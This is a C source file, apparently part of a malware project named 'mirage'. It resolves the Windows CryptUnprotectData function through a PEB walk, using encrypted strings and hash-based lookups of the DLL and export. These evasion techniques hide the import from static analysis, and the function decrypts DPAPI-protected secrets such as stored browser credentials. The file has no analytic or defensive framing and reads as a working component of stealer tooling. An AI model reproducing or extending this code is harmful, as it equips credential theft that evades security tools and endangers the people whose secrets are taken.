/*
 * crypt32_peb.c — PEB-resolved Crypt32 API singleton
 *
 * Resolves CryptUnprotectData from crypt32.dll via PEB-walk.
 */
#include "crypt32_peb.h"
#include "config.h"
#include "enc_strings.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"

static crypt32_api_t g_crypt32;

const crypt32_api_t *mirage_crypt32_api(void) {
    if (g_crypt32.ready) return &g_crypt32;

    char dll[32];
    enc_decrypt(enc_crypt32, ENC_CRYPT32_LEN, dll);
    void *mod = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!mod) return NULL;

    char fn[32];
    enc_decrypt(enc_CryptUnprotectData, ENC_CRYPTUNPROTECTDATA_LEN, fn);
    g_crypt32.pUnprotect = (pCryptUnprotectData)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    if (!g_crypt32.pUnprotect) return NULL;

    g_crypt32.ready = 1;
    return &g_crypt32;
}
